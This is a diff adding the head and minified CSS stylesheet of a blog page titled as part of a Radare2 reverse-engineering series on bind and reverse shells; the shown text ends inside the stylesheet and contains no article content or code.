@@ -1,0 +1,1299 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Reverse engineering x64 binaries with Radare2 - 18 (Bind and reverse shells)</title>
+  <meta name='description' content='All things cyber'>
+
+  <link rel="canonical" href="http://localhost:4000/reversing-radare-18">
+  <link rel="alternate" type="application/rss+xml" title="Artik Blue" href="/feed.xml">
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Ionicons -->
+  <link href="https://unpkg.com/ionicons@4.2.2/dist/css/ionicons.min.css" rel="stylesheet">
+
+  <style>
+  
+      /*!------------------------------------------------------------------
+[MAIN STYLESHEET]
+-------------------------------------------------------------------*/.list-reset{list-style-type:none;margin:0;padding:0}.clearfix::after,.clearfix ::before{content:"";display:table;clear:both}.screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px;word-wrap:normal !important}/*! normalize.css v8.0.0 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}h1{font-size:2em;margin:0.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace, monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace, monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-0.25em}sup{top:-0.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:0.35em 0.75em 0.625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}body,h1,h2,h3,h4,h5,h6,p,blockquote,pre,dl,dd,ol,ul,fieldset,legend,figure,hr{margin:0;padding:0}li>ul,li>ol{margin-bottom:0}table{border-collapse:collapse;border-spacing:0}h1,h2,h3,h4,h5,h6,ul,ol,dl,blockquote,p,address,hr,table,fieldset,figure,pre{margin-bottom:30px}ul,ol,dd{margin-left:15px}ul li,ol li{margin-bottom:10px}.highlight{background:#161d25}.highlighter-rouge .highlight{background:#eef}.highlight .c{color:#998;font-style:italic}.highlight .err{color:#a61717;background-color:#e3d2d2}.highlight .k{font-weight:bold}.highlight .o{font-weight:bold}.highlight .cm{color:#998;font-style:italic}.highlight .cp{color:#999;font-weight:bold}.highlight .c1{color:#998;font-style:italic}.highlight .cs{color:#999;font-weight:bold;font-style:italic}.highlight .gd{color:#000;background-color:#fdd}.highlight .gd .x{color:#000;background-color:#faa}.highlight .ge{font-style:italic}.highlight .gr{color:#a00}.highlight .gh{color:#999}.highlight .gi{color:#000;background-color:#dfd}.highlight .gi .x{color:#000;background-color:#afa}.highlight .go{color:#888}.highlight .gp{color:#555}.highlight .gs{font-weight:bold}.highlight .gu{color:#aaa}.highlight .gt{color:#a00}.highlight .kc{font-weight:bold}.highlight .kd{font-weight:bold}.highlight .kp{font-weight:bold}.highlight .kr{font-weight:bold}.highlight .kt{color:#458;font-weight:bold}.highlight .m{color:#099}.highlight .s{color:#d14}.highlight .na{color:teal}.highlight .nb{color:#0086B3}.highlight .nc{color:#458;font-weight:bold}.highlight .no{color:teal}.highlight .ni{color:purple}.highlight .ne{color:#900;font-weight:bold}.highlight .nf{color:#900;font-weight:bold}.highlight .nn{color:#555}.highlight .nt{color:navy}.highlight .nv{color:teal}.highlight .ow{font-weight:bold}.highlight .w{color:#bbb}.highlight .mf{color:#099}.highlight .mh{color:#099}.highlight .mi{color:#099}.highlight .mo{color:#099}.highlight .sb{color:#d14}.highlight .sc{color:#d14}.highlight .sd{color:#d14}.highlight .s2{color:#d14}.highlight .se{color:#d14}.highlight .sh{color:#d14}.highlight .si{color:#d14}.highlight .sx{color:#d14}.highlight .sr{color:#009926}.highlight .s1{color:#d14}.highlight .ss{color:#990073}.highlight .bp{color:#999}.highlight .vc{color:teal}.highlight .vg{color:teal}.highlight .vi{color:teal}.highlight .il{color:#099}.container{max-width:1270px;padding-left:15px;padding-right:15px;margin:0 auto}@media only screen and (max-width: 1300px){.container{max-width:1100px}}@media only screen and (max-width: 1130px){.container{max-width:1000px}}@media only screen and (max-width: 1024px){.container{max-width:740px}}@media only screen and (max-width: 768px){.container{max-width:540px}}@media only screen and (max-width: 576px){.container{max-width:380px}}.row{display:flex;flex-wrap:wrap;flex:0 1 auto;flex-direction:row;box-sizing:border-box;margin-left:-15px;margin-right:-15px}.col{padding-left:15px;padding-right:15px}[class^="col-"]{flex:auto}.col-0{width:0%}.col-1{width:8.3333333333%}.col-2{width:16.6666666667%}.col-3{width:25%}.col-4{width:33.3333333333%}.col-5{width:41.6666666667%}.col-6{width:50%}.col-7{width:58.3333333333%}.col-8{width:66.6666666667%}.col-9{width:75%}.col-10{width:83.3333333333%}.col-11{width:91.6666666667%}.col-12{width:100%}.push-0{margin-left:0%}.push-1{margin-left:8.3333333333%}.push-2{margin-left:16.6666666667%}.push-3{margin-left:25%}.push-4{margin-left:33.3333333333%}.push-5{margin-left:41.6666666667%}.push-6{margin-left:50%}.push-7{margin-left:58.3333333333%}.push-8{margin-left:66.6666666667%}.push-9{margin-left:75%}.push-10{margin-left:83.3333333333%}.push-11{margin-left:91.6666666667%}.push-12{margin-left:100%}.pull-0{margin-right:0%}.pull-1{margin-right:8.3333333333%}.pull-2{margin-right:16.6666666667%}.pull-3{margin-right:25%}.pull-4{margin-right:33.3333333333%}.pull-5{margin-right:41.6666666667%}.pull-6{margin-right:50%}.pull-7{margin-right:58.3333333333%}.pull-8{margin-right:66.6666666667%}.pull-9{margin-right:75%}.pull-10{margin-right:83.3333333333%}.pull-11{margin-right:91.6666666667%}.pull-12{margin-right:100%}@media (max-width: 1024px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}@media (max-width: 1024px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}@media (max-width: 1024px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}img[data-action="zoom"]{cursor:pointer;cursor:-webkit-zoom-in;cursor:-moz-zoom-in}.zoom-img,.zoom-img-wrap{position:relative;z-index:666;-webkit-transition:all 300ms;-o-transition:all 300ms;transition:all 300ms}img.zoom-img{cursor:pointer;cursor:-webkit-zoom-out;cursor:-moz-zoom-out}.zoom-overlay{z-index:420;background:#161d25;position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;opacity:0;-webkit-transition:opacity 300ms;-o-transition:opacity 300ms;transition:opacity 300ms}.zoom-overlay-open .zoom-overlay{opacity:1}.zoom-overlay-open,.zoom-overlay-transitioning{cursor:default}.animate{animation:animateElement cubic-bezier(0.3, 0.45, 0.45, 0.95) 0.75s;animation-duration:0.5s;animation-iteration-count:1;transition:transform .15s}@keyframes animateElement{0%{opacity:0;transform:translate(0px, 50px)}100%{opacity:1;transform:translate(0px, 0px)}}*,*::after,*::before{box-sizing:border-box}body{font-family:"Inter",Helvetica Neue,Helvetica,Arial,sans-serif;font-size:18px;line-height:34px;border:10px solid #131212;color:#fff;background-color:#131212;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}body.dark .footer__head{background:#131212}@media only screen and (max-width: 768px){body.dark .footer__head{padding:40px}}@media only screen and (max-width: 576px){body.dark .footer__head{padding:30px}}body.dark .subscribe-form .subscribe-email{background:#161d25}@media only screen and (max-width: 576px){body{font-size:16px;line-height:29px;border-width:5px}}*::selection{color:#fff;background-color:rgba(0,112,255,0.8)}h1,h2,h3,h4,h5,h6{font-family:"Inter",Helvetica Neue,Helvetica,Arial,sans-serif;font-weight:700;line-height:1.3;letter-spacing:-1px}h1{font-size:36px}h2{font-size:28px}h3{font-size:24px}h4{font-size:20px}h5{font-size:18px}h6{font-size:16px}blockquote{position:relative;margin-top:30px;padding:25px 25px 15px 60px;font-size:30px;line-height:45px;font-weight:600;font-style:normal}blockquote::before{content:'\201C';position:absolute;top:0.35em;left:0.05em;font-size:3.5em;color:#0070ff}blockquote p{margin-bottom:10px}blockquote cite{display:inline-block;margin-top:7px;font-size:15px;font-style:normal;color:#ccc}blockquote cite:before{content:'\2014' '\00a0'}@media only screen and (max-width: 1024px){blockquote{font-size:24px;line-height:37px}}@media only screen and (max-width: 576px){blockquote{padding:38px 0 15px 35px;font-size:21px;line-height:31px}}pre{overflow:auto;padding:15px;margin-bottom:0;font-size:14px;white-space:pre-wrap;word-wrap:break-word;word-break:break-all}img,.zoom-img-wrap{max-width:100%;height:auto;vertical-align:middle}img+em,.zoom-img-wrap+em{display:block;margin-top:15px;font-size:14px;line-height:22px;font-style:normal;font-weight:normal;text-align:center;color:#fff}img+em a,.zoom-img-wrap+em a{border-bottom:1px solid #fff}img+em a:hover,.zoom-img-wrap+em a:hover{color:#fff;border-color:#0070ff}a{text-decoration:none;color:#fff;transition:all 0.35s}a:hover{color:#fff}hr{display:block;height:1px;width:100px;margin:50px 0;border:0;background:#000}.wrapper-page{margin-bottom:70px}@media only screen and (max-width: 768px){.wrapper-page{margin-bottom:60px}}@media only screen and (max-width: 576px){.wrapper-page{margin-bottom:40px}}.button{display:inline-block;height:45px;padding:0 20px;font-size:15px;font-weight:700;border:none;outline:none;color:#fff;background:#0070ff;transition:all 0.35s;cursor:pointer}.button:hover{color:#fff;background:#0065e6}.lazy{opacity:0;transition:0.3s}.lazy.loaded{opacity:1}.top{position:fixed;bottom:40px;right:-100px;z-index:1;width:28px;height:40px;font-size:28px;line-height:40px;text-align:center;border-radius:6px;background-color:#161d25;color:#fff;cursor:pointer;transition:all .25s ease;box-shadow:0px 0px 20px rgba(0,0,0,0.05)}.top:hover{color:#fff;background-color:#0070ff}.top.is-active{right:40px}@media only screen and (max-width: 768px){.top{bottom:25px}.top.is-active{right:30px}}.header{height:auto;border-bottom:1px solid #131212;background:#161d25;transition:all 0.35s}.header .header__overlay{position:fixed;top:0;right:0;bottom:0;left:0;z-index:15;background-color:rgba(17,17,17,0.7);cursor:pointer;opacity:0;visibility:hidden;transition:all 0.5s ease}@media only screen and (max-width: 1024px){.header .header__overlay.is-visible{opacity:1;visibility:visible}}.header__inner{position:relative;display:flex;align-items:center;min-height:80px}.logo__link{font-size:20px;line-height:26px;font-weight:700}.logo__link:hover{color:#0070ff}.logo__image{max-height:50px}.main-nav{margin-left:80px}@media only screen and (max-width: 1024px){.main-nav{position:fixed;top:0;left:inherit;right:-300px;bottom:0;transform:none;z-index:100;width:300px;height:100vh;padding:40px 30px 30px;border:10px solid #131212;transition:right 0.5s cubic-bezier(0.7, 0.4, 0, 1);background:#161d25}.main-nav.is-open{right:0}.main-nav .nav__list{width:100%}.main-nav .nav__list .nav__item{display:block;margin:0 10px}.main-nav .nav__list .nav__item:last-child{margin-right:10px}.main-nav .nav__list .nav__item .nav__link{display:block;padding:10px 0;font-size:16px;line-height:26px;font-weight:500}}@media only screen and (max-width: 576px){.main-nav{padding:20px 30px;border-width:5px}}.main-nav__box{display:flex;align-items:center}.main-nav__box .nav__icon-close{display:none;font-size:24px;text-align:right}.main-nav__box .nav__icon-close .ion-md-close{transition:all 0.35s;cursor:pointer}.main-nav__box .nav__icon-close .ion-md-close:hover{color:#0070ff}.main-nav__box .nav__title{display:none}@media only screen and (max-width: 1024px){.main-nav__box{display:block}.main-nav__box .nav__icon-close{display:block}.main-nav__box .nav__title{display:block;margin:0 10px 15px;padding-bottom:15px;font-size:24px;font-weight:700;color:#fff;border-bottom:1px solid #131212}}.nav__list .nav__item{display:inline-block;margin:0 20px}.nav__list .nav__item:last-child{margin-right:40px}.nav__list .nav__item .nav__link{font-size:15px;line-height:24px;font-weight:500}.nav__list .nav__item .nav__link:hover{color:#0070ff}.nav-buttons{display:flex;align-items:center;margin-left:auto;font-size:21px;color:#fff;cursor:pointer}.nav-buttons .nav__icon{transition:all 0.35s}.nav-buttons .nav__icon:hover{color:#0070ff}.nav-buttons .nav__icon:first-child{margin-right:15px}.nav-buttons .nav__icon-menu{display:none}@media only screen and (max-width: 1024px){.nav-buttons{margin-left:auto}.nav-buttons .nav__icon-menu{display:block}}.search{position:fixed;top:0;left:0;right:0;bottom:0;z-index:-1;transform:scale(0.95);overflow:auto;opacity:0;background:#131212;transition:all .25s ease}.search.is-visible{transform:scale(1);z-index:100;opacity:1;transition:all .25s ease}.search__box{width:50%;margin:0 auto;padding-top:140px}@media only screen and (max-width: 1024px){.search__box{width:80%;padding-top:100px}}.search__group{position:relative;margin-bottom:50px}.search__group .search__close{position:absolute;right:20px;top:17px;font-size:27px;line-height:40px;cursor:pointer;transition:all .2s}.search__group .search__close:hover{color:#0070ff}.search__group .search__text{width:100%;padding:20px;font-size:21px;line-height:31px;border:2px solid transparent;border-radius:4px;color:#fff;background:#161d25;outline:none;transition:all .2s}.search__group .search__text:focus{border-color:#0070ff}.search__group .search__text::placeholder{font-weight:500;color:#fff}.search__group .search__text::-ms-clear{display:none}.search-results-list .no-results{width:100%;font-size:21px;font-weight:600;text-align:center;color:#fff}.pagination{margin-top:40px}@media only screen and (max-width: 768px){.pagination{margin-top:30px}}@media only screen and (max-width: 576px){.pagination{margin-top:20px}}.pagination__inner{display:flex;justify-content:center;align-items:center}.pagination__list{display:flex;font-weight:600;height:40px;padding:0 20px;font-size:14px;line-height:40px;border-radius:3px;box-shadow:0px 0px 20px rgba(0,0,0,0.05);color:#fff;background-color:#161d25}.pagination__count{display:inline-block;padding:0 15px;margin:0 15px;font-size:13px;border-left:1px solid rgba(255,255,255,0.1);border-right:1px solid rgba(255,255,255,0.1);color:#ccc}.pagination__next i,.pagination__prev i{font-size:13px}.pagination__next:hover,.pagination__prev:hover{color:#0070ff}.pagination__next.disabled,.pagination__prev.disabled{opacity:0.2;cursor:not-allowed;color:inherit}.pagination__next i{margin-left:4px}.pagination__prev i{margin-right:4px}.footer{padding-top:70px;background:#161d25}.footer .row .col{flex-grow:1}.footer .footer__inner{padding:60px 0;margin:0 60px 0;background-image:-webkit-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-moz-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-ms-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);-webkit-background-size:15px 15px;-moz-background-size:15px 15px;background-size:15px 15px}.footer .footer__head{margin:0 -60px;padding:60px;background:#161d25;box-shadow:0 10px 40px rgba(0,0,0,0.07)}.footer .footer__content{padding:60px 0}@media only screen and (max-width: 1024px){.footer .row .col:last-child>.widget{margin-bottom:0}}@media only screen and (max-width: 768px){.footer{padding-top:60px}.footer .footer__inner{padding:0;margin:0;background-image:none}.footer .footer__head{margin:0;padding:0;box-shadow:none}}@media only screen and (max-width: 576px){.footer{padding-top:50px}}@media only screen and (max-width: 1024px){.widget{margin-bottom:30px}}@media only screen and (max-width: 576px){.widget{margin-bottom:40px}}.widget__head{margin-bottom:20px}.widget__head .widget__title{margin:0;font-size:24px;color:#fff}.widget-gallery{padding:0 35px}@media only screen and (max-width: 1024px){.widget-gallery{padding:0}}.recent-posts{position:relative;display:flex;margin-bottom:15px}.recent-posts:last-child{margin-bottom:0}.recent-posts__header{margin-right:15px}.recent-posts__image{position:relative;display:block;margin-right:15px;min-width:80px;height:80px;background-size:cover;background-position:center;background-repeat:no-repeat;background-color:#131212}.recent-posts__image img{position:absolute;top:0;width:100%;height:100%;object-fit:cover}.recent-posts__date{margin-bottom:5px;font-size:13px;line-height:16px;color:#ccc}.recent-posts__title{margin-bottom:0;font-size:17px;line-height:22px;font-weight:700}.recent-posts__title a{color:#fff}.recent-posts__title a:hover{color:#fff}.widget-subscribe .subscribe__inner{display:flex;flex-direction:column;justify-content:space-between}.widget-subscribe .subscribe__group{margin-bottom:20px}.widget-subscribe .subscribe__group .subscribe__title{margin-bottom:15px;color:#fff}.widget-subscribe .subscribe__group .subscribe__description{font-size:15px;line-height:22px;color:#ccc}.widget-subscribe .subscribe-form{position:relative;height:60px}.widget-subscribe .subscribe-form .subscribe-email{width:100%;height:100%;padding:20px;font-size:14px;line-height:19px;font-weight:500;color:rgba(255,255,255,0.8);border:2px solid #131212;background:transparent;transition:border-color .2s ease-in-out;outline:0}.widget-subscribe .subscribe-form .subscribe-email::placeholder{color:rgba(255,255,255,0.8)}.widget-subscribe .subscribe-form 